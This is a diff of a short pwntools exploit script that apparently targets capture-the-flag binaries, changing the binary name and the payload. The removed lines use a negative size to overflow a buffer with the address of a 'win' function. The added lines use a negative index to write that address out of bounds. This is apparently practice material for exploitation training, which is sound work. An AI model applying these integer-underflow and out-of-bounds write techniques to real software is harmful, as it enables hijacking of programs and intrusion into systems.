@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from pwn import *
 
-BIN_FILE  = './echo'
+BIN_FILE  = './chal'
 LIBC_FILE = ''
 
 HOST = args.HOST or 'localhost'
@@ -23,8 +23,8 @@ def start():
     return process(BIN_FILE)
 
 def attack(io):
-    io.sendlineafter('Size: ', '-2147483648')
-    io.sendlineafter('Data: ', p64(binf.sym['win']) * (0x120 // 8))
+    io.sendlineafter(b'pos > ', '-6')
+    io.sendlineafter(b'val > ', str(binf.sym['win'] ))
 
 def main():
     io = start()
